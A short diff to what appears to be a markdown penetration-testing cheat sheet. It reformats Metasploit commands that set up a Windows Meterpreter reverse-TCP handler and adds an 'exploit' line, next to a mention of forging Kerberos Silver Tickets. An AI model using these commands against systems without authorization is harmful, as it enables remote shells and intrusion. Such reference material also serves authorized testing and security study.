@@ -437,7 +437,8 @@ Note: To create a Silver Ticket, simply put a service NTLM hash into the `/krbtg
  > 
  > **<font color=red>use</font> <font color=lightblue>exploit/multi/handler</font>**</br>
  > 
- > **<font color=red>set payload</font> windows/x64/meterpreter/reverse_tcp**</br>
+ > \*\*<font color=red>set payload windows/x64/meterpreter/reverse_tcp</font> \*\*</br>
+ > **<font color=red>exploit</font>**</br>
  > Handler for Windows Meterpreter.
 
 ##### Exploit
